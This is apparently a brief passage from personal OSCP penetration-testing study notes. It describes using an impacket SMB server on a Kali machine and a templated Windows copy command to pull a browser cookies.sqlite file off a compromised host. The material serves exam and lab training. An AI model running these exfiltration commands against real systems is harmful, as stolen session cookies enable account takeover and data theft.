## STEP 3 (CORRECT) – Use SMB to send file to Kali

### On **Kali**:

```
sudo impacket-smbserver share ~/Desktop/[path] -smb2support
```

---

### On **Windows RDP**:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\Users\\Public\\cookies.sqlite \\\\${KaliIP}\\share\ `;

dv.paragraph("```bash\n" + command + "\n```");
```


✔ File now lands on Kali Desktop  
✔ No hosting on Windows  
✔ No firewall problems